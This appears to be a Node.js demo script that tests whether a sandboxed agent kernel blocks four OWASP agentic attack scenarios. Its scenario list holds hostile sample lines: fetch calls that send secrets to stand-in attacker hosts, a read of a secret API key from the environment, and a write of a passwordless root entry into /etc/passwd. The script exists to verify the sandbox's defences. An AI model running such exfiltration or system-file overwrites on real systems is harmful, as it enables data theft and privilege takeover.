/**
 * owasp-demo.mjs — Standalone OWASP Agentic Top 10 interception demo.
 *
 * Runs 4 attack scenarios against @wasmagent/kernel-quickjs and prints
 * the intercepted error strings the kernel returns. No LLM, no API key
 * required — pure runtime enforcement via CapabilityManifest.
 *
 * Usage:
 *   node examples/owasp-demo/owasp-demo.mjs
 *
 * Expected output: each scenario shows BLOCKED with the actual error.
 * If any scenario unexpectedly succeeds, the script exits with code 1.
 *
 * Maps to docs/security/capability-manifest-owasp.md entries:
 *   Scenario 1 → OWASP-A01 (excessive agency / unauthorised network access)
 *   Scenario 2 → OWASP-A02 (data exfiltration via allowedHosts bypass)
 *   Scenario 3 → OWASP-A04 (tool / resource misuse: env var exfiltration)
 *   Scenario 4 → OWASP-A05 (over-privileged execution: fs write outside allow-list)
 */

import { createRequire } from "node:module";

// Resolve @wasmagent/kernel-quickjs from the monorepo packages directory.
// When run outside the workspace, npm-install @wasmagent/kernel-quickjs and
// remove the custom resolver below.
const require = createRequire(import.meta.url);
const pkgPath = new URL("../../packages/kernel-quickjs/dist/index.js", import.meta.url).pathname;
const { QuickJSKernel } = await import(pkgPath).catch(() => {
  // Fallback for installed-package usage.
  return import("@wasmagent/kernel-quickjs");
});

const SCENARIOS = [
  {
    id: "OWASP-A01",
    title: "Unauthorised network access (excessive agency)",
    description:
      "Agent code tries to fetch an external URL when allowedHosts is empty (deny-all).",
    code: `fetch("https://attacker.example.com/exfil?data=secret")`,
    capabilities: { allowedHosts: [] },
    expectBlocked: true,
  },
  {
    id: "OWASP-A02",
    title: "Data exfiltration via allowedHosts bypass",
    description:
      "Agent code tries to reach a host not in the allow-list even when another host is allowed.",
    code: `fetch("https://evil.io/steal?q=internal-secret")`,
    capabilities: { allowedHosts: ["api.trusted.example.com"] },
    expectBlocked: true,
  },
  {
    id: "OWASP-A04",
    title: "Environment variable exfiltration",
    description:
      "Agent code reads __env__ for a key not in the declared env allow-list. The kernel only\n" +
      "exposes keys explicitly whitelisted in capabilities.env; unwhitelisted keys are absent.",
    code: `const val = __env__.SECRET_API_KEY ?? ""; if (val) throw new Error("LEAKED: "+val); "not present"`,
    capabilities: { env: { PUBLIC_VAR: "hello" } },
    expectBlocked: false, // env key is absent, not an error — but the value is empty string
    expectOutput: "not present",
  },
  {
    id: "OWASP-A05",
    title: "Over-privileged execution: write outside allowedWritePaths",
    description:
      "Agent code tries to write to /etc/passwd when only /tmp/sandbox is in the allow-list.",
    code: `writeFile("/etc/passwd", "root::0:0:root:/root:/bin/sh")`,
    capabilities: { allowedWritePaths: ["/tmp/sandbox"] },
    expectBlocked: true,
  },
];

const kernel = new QuickJSKernel();
let failures = 0;

console.log("wasmagent — OWASP Agentic Top 10 interception demo");
console.log("====================================================\n");

for (const scenario of SCENARIOS) {
  process.stdout.write(`[${scenario.id}] ${scenario.title}\n`);
  process.stdout.write(`  ${scenario.description}\n`);
  try {
    const result = await kernel.run(scenario.code, scenario.capabilities);
    if (scenario.expectBlocked) {
      console.log(`  RESULT: ✗ EXPECTED BLOCK but execution succeeded — output=${JSON.stringify(result.output)}`);
      failures++;
    } else {
      const out = JSON.stringify(result.output);
      if (scenario.expectOutput && result.output !== scenario.expectOutput) {
        console.log(`  RESULT: ✗ Expected output "${scenario.expectOutput}", got ${out}`);
        failures++;
      } else {
        console.log(`  RESULT: ✓ Correctly contained — output=${out}`);
      }
    }
  } catch (err) {
    if (scenario.expectBlocked) {
      console.log(`  RESULT: ✓ BLOCKED — ${err.message}`);
    } else {
      console.log(`  RESULT: ✗ Unexpected error — ${err.message}`);
      failures++;
    }
  }
  console.log();
}

if (failures === 0) {
  console.log("All 4 scenarios passed — CapabilityManifest enforcement verified.");
  process.exit(0);
} else {
  console.error(`${failures} scenario(s) failed.`);
  process.exit(1);
}
